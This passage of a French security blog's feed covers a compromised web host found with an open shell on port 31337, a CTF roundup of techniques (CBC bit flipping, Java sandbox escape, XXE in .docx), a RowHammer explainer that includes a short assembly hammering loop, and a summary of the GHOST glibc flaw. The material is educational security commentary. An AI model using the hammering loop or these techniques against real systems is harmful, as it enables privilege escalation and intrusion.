+&lt;p&gt;Ma réponse n'a pas dû plaire au "Développeur en chef" puisque c'est une autre personne qui m'a répondu que la faille était "patchée" et "bloquée niveau firewall".&lt;/p&gt;
+&lt;p&gt;Je cherche à en savoir plus sur l'origine de ce shell et j'obtiens une réponse pour le moins originale :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;"Le port avait été ouvert lors d'une très ancienne intervention et
+n'avait pas été fermé correctement."&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;De toute évidence ma réponse au "Développeur en chef" avait tapé dans le mille : les pseudos audits de sécurité quotidiens n'avaient pas vu le port 31337 ouvert.&lt;/p&gt;
+&lt;p&gt;Pire, le firewall semblait être un firewall à DROP.&lt;/p&gt;
+&lt;p&gt;Pour ceux qui ne connaissent pas les firewalls à DROP sachez que cela correspond grossièrement à ajouter des règles interdisant d'ouvrir tel ou tel port, ce qui n'est absolument pas sécurisé.&lt;/p&gt;
+&lt;h2&gt;Retour d'expérience chez PulseHeberg&lt;/h2&gt;
+&lt;p&gt;Avant d'en venir à des conclusions hâtives, je souhaiterais vous éclairer sur les points essentiels de mon ressenti sur "l'expérience Pulseheberg".&lt;/p&gt;
+&lt;p&gt;Lors de mon inscription, j'ai commandé un VPS afin de gérer moi-même la sécurité du serveur.&lt;/p&gt;
+&lt;p&gt;La livraison s'est déroulée sans encombre. Par contre, mes 8 Go de RAM allouée ne semblaient pas correspondre au résultat fourni par la commande "free" qui m'indiquait 8To.&lt;/p&gt;
+&lt;p&gt;J'ai appris plus tard qu'ils avaient mal configuré la VM.&lt;/p&gt;
+&lt;p&gt;Je me demande ce que cela aurait fait si j'avais mis à profit ces 8To, sûrement une coupure générale de toutes les VM du parc.&lt;/p&gt;
+&lt;p&gt;Au bout d'un mois, le serveur ne répondait plus, même via ssh, en tant "qu'administrateur de VPS du weekend" et avec ma confiance en moi légendaire, j'ai pensé à une erreur de ma part, personne n'est infaillible.&lt;/p&gt;
+&lt;p&gt;J'ai donc totalement réinstallé le serveur et le problème a persisté. Après trois tickets au support, il m'a semblé que le problème les dépassait.&lt;/p&gt;
+&lt;p&gt;J'avais déjà avancé de l'argent sur leur service, il me restait aux alentours de 40 euros, c'est pourquoi j'ai décidé de changer de prestation vers un hébergement mutualisé, la suite vous la connaissez...&lt;/p&gt;
+&lt;p&gt;Si je devais choisir un point positif chez PulseHeberg cela serait les tickets au support, auxquels on reçoit une réponse dans un temps record, environ une quinzaine de minutes, j'ai toujours eu l'impression que le support prenait vraiment mon problème à cœur.&lt;/p&gt;
+&lt;p&gt;Malgré un support à l'écoute ainsi que des prix défiants toute concurrence, leurs compétences gâchent totalement le service.&lt;/p&gt;
+&lt;p&gt;On comprend bien qu'ils essaient de faire de leur mieux, en revanche, comme vous vous en doutez, je ne vous conseille pas cet hébergeur, sauf si vous ne vous intéressez pas à la sécurité de votre site.&lt;/p&gt;
+&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à commenter cet article ainsi qu'à rejoindre mon &lt;a href="https://twitter.com/Geluchat"&gt;Twitter&lt;/a&gt; pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique. &lt;/p&gt;
+&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="L'actualité commentée"></category><category term="wordpress"></category><category term="pirater"></category><category term="pulseheberg"></category></entry><entry><title>BCTF, 0CTF et BackDoorCTF</title><link href="https://test.dailysecurity.fr/bctf-0ctf-backdoorctf" rel="alternate"></link><published>2015-04-03T21:16:00+02:00</published><updated>2015-04-03T21:16:00+02:00</updated><author><name>Geluchat</name></author><id>tag:test.dailysecurity.fr,2015-04-03:/bctf-0ctf-backdoorctf</id><summary type="html">&lt;p&gt;J'ai récemment participé au BCTF, au 0CTF ainsi qu'au BackDoorCTF.&lt;/p&gt;
+&lt;p&gt;À cette occasion, j'ai appris de nouvelles failles, notamment de la
+cryptographie, une méthode d'escape de sandbox Java et une autre forme
+de XXE.&lt;/p&gt;
+&lt;p&gt;Si vous souhaitez vous renseigner sur ces techniques je vous en fais une
+petite liste:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Le …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;J'ai récemment participé au BCTF, au 0CTF ainsi qu'au BackDoorCTF.&lt;/p&gt;
+&lt;p&gt;À cette occasion, j'ai appris de nouvelles failles, notamment de la
+cryptographie, une méthode d'escape de sandbox Java et une autre forme
+de XXE.&lt;/p&gt;
+&lt;p&gt;Si vous souhaitez vous renseigner sur ces techniques je vous en fais une
+petite liste:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Le Bit Flipping: Une manière d'altérer un cookie peu protégé par un
+    chiffrement CBC.&lt;br&gt;
+    Plus d'informations
+    &lt;a href="https://github.com/smokeleeteveryday/CTF_WRITEUPS/blob/master/2015/CODEGATE/web/owltube/README.md"&gt;ici&lt;/a&gt;
+    ou encore
+    &lt;a href="http://www.pwntester.com/blog/2015/03/30/0ctf-2015-mislead-web-300/"&gt;ici&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Le &lt;a href="http://clojure.org/"&gt;clojure&lt;/a&gt;, une sorte de langage natif
+    interprété à l’intérieur de la JVM.&lt;br&gt;
+    Très utile lors des
+    &lt;a href="https://github.com/ctfs/write-ups-2015/tree/master/backdoor-ctf-2015/exploit/noname"&gt;escapes&lt;/a&gt;
+    de sandbox&lt;/li&gt;
+&lt;li&gt;Les XXE into &lt;em&gt;.docx&lt;/em&gt;&lt;br&gt;
+    En effet, les parsers de &lt;em&gt;.docx&lt;/em&gt; sont sensibles au XXE comme le
+    montre le challenge
+    &lt;a href="http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/"&gt;GoldenMac&lt;/a&gt;
+    du 0CTF&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon
+&lt;a href="https://twitter.com/Geluchat"&gt;Twitter&lt;/a&gt; pour avoir des news sur le site
+et mon point de vue sur l’actualité de la sécurité informatique.&lt;br&gt;
+Geluchat.&lt;/p&gt;</content><category term="L'actualité commentée"></category><category term="WriteUp"></category><category term="CTF"></category></entry><entry><title>La vulnérabilité RowHammer</title><link href="https://test.dailysecurity.fr/rowhammer" rel="alternate"></link><published>2015-03-17T11:48:00+01:00</published><updated>2015-03-17T11:48:00+01:00</updated><author><name>Geluchat</name></author><id>tag:test.dailysecurity.fr,2015-03-17:/rowhammer</id><summary type="html">&lt;p&gt;Voici déjà une semaine que cette
+&lt;a href="http://googleprojectzero.blogspot.in/2015/03/exploiting-dram-rowhammer-bug-to-gain.html"&gt;vulnérabilité&lt;/a&gt;
+fait parler d'elle, elle permet une élévation de privilège d'une manière
+très étonnante.&lt;/p&gt;
+&lt;h3&gt;Le concept&lt;/h3&gt;
+&lt;p&gt;Elle repose sur une erreur de conception matérielle de certaines
+barrettes de DRAM (Dynamic Random Access Memory).&lt;/p&gt;
+&lt;p&gt;Il y a dans ces dernières des millions de condensateurs très …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Voici déjà une semaine que cette
+&lt;a href="http://googleprojectzero.blogspot.in/2015/03/exploiting-dram-rowhammer-bug-to-gain.html"&gt;vulnérabilité&lt;/a&gt;
+fait parler d'elle, elle permet une élévation de privilège d'une manière
+très étonnante.&lt;/p&gt;
+&lt;h3&gt;Le concept&lt;/h3&gt;
+&lt;p&gt;Elle repose sur une erreur de conception matérielle de certaines
+barrettes de DRAM (Dynamic Random Access Memory).&lt;/p&gt;
+&lt;p&gt;Il y a dans ces dernières des millions de condensateurs très proches les
+uns des autres.&lt;/p&gt;
+&lt;p&gt;Ainsi, lorsque l'on modifie un bit, il y a des chances pour que les
+condensateurs adjacents soient modifiés, on appelle ça du 'Bit
+flipping'  &lt;/p&gt;
+&lt;p&gt;Plus précisément, l'exploit fonctionne sur le principe suivant:&lt;/p&gt;
+&lt;p&gt;On cherche à modifier des bits de la mémoire qui ne nous appartiennent
+pas.&lt;br&gt;
+Pour cela, on utilise une technique dite RowHammer ("Martellement de
+colonne") qui consiste à lire un bit sur une colonne puis à vider sa
+cellule et on répète en boucle.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nl"&gt;code1a:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;X&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;%eax&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;; Read from address X&lt;/span&gt;
+&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Y&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;%ebx&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;; Read from address Y&lt;/span&gt;
+&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nf"&gt;clflush&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;X&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;; Flush cache for address X&lt;/span&gt;
+&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nf"&gt;clflush&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;; Flush cache for address Y&lt;/span&gt;
+&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nf"&gt;jmp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;code1a&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Poussé à l’extrême, cela mène à une élévation de privilèges&lt;/p&gt;
+&lt;h3&gt;Mon avis, les conséquences futurs&lt;/h3&gt;
+&lt;p&gt;J'aime beaucoup les failles liées à un vrai défaut technique et matériel de la part du concepteur.&lt;/p&gt;
+&lt;p&gt;Pour moi, ces vulnérabilités d'un type novateur n'annoncent que les prémisses d'une refonte du concept même des architectures modernes et des matériaux utilisés.&lt;/p&gt;</content><category term="L'actualité commentée"></category><category term="A chaud"></category><category term="News"></category></entry><entry><title>Introduction et présentation de la faille GHOST</title><link href="https://test.dailysecurity.fr/faille-ghost" rel="alternate"></link><published>2015-02-27T20:04:00+01:00</published><updated>2015-02-27T20:04:00+01:00</updated><author><name>Geluchat</name></author><id>tag:test.dailysecurity.fr,2015-02-27:/faille-ghost</id><summary type="html">&lt;p&gt;Cet article sert d'introduction à la partie actualité commentée du site.&lt;/p&gt;
+&lt;p&gt;Celle-ci sera composée de nouveautés liées aux différentes CVE actuelles ou encore sur des événements de type Capture The Flag qui comporteraient des éléments intéressants.&lt;/p&gt;
+&lt;p&gt;Ayant manqué la faille GHOST (CVE-2015-0235) qui est apparue pendant la création de ce …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cet article sert d'introduction à la partie actualité commentée du site.&lt;/p&gt;
+&lt;p&gt;Celle-ci sera composée de nouveautés liées aux différentes CVE actuelles ou encore sur des événements de type Capture The Flag qui comporteraient des éléments intéressants.&lt;/p&gt;
+&lt;p&gt;Ayant manqué la faille GHOST (CVE-2015-0235) qui est apparue pendant la création de ce site, je ne saurais que vous conseiller de lire les différents documents disponibles sur le net.&lt;/p&gt;
+&lt;p&gt;Pour ceux qui ne connaitraient pas cette faille ou qui ne se seraient pas penchés sur le sujet je vais vous faire une courte description de la faille.&lt;/p&gt;
+&lt;p&gt;La faille GHOST, qui tient son nom de la fonction gethostbyname(), est présente dans la version 2.2 de glibc et permet de gagner un accès shell à une machine distante.&lt;/p&gt;
+&lt;p&gt;Il faut savoir que cette faille a été patchée en mai 2013 mais n'a pas été prise en compte par les nouvelles distributions qui n'ont pas associé la mise à jour à un danger.&lt;/p&gt;
+&lt;p&gt;On peut y compter Centos, Fedora ainsi que Ubuntu.&lt;/p&gt;
+&lt;p&gt;Elle consiste en l'exploitation d'un Heap Overflow complexe car il permet de réécrire la mémoire uniquement avec des nombres et des points.&lt;/p&gt;
+&lt;p&gt;Néanmoins, plusieurs exploits ont vu le jour et touchent des programmes importants tels que Apache, Nginx, Mysql ou encore SendMail (EDIT: non exploitable pour ces deux derniers).&lt;/p&gt;
+&lt;p&gt;Pour plus d'informations, l'excellent &lt;a href="http://www.openwall.com/lists/oss-security/2015/01/27/9"&gt;PoC&lt;/a&gt; de Qualys Security&lt;/p&gt;</content><category term="L'actualité commentée"></category><category term="libc"></category><category term="CVE"></category></entry></feed>
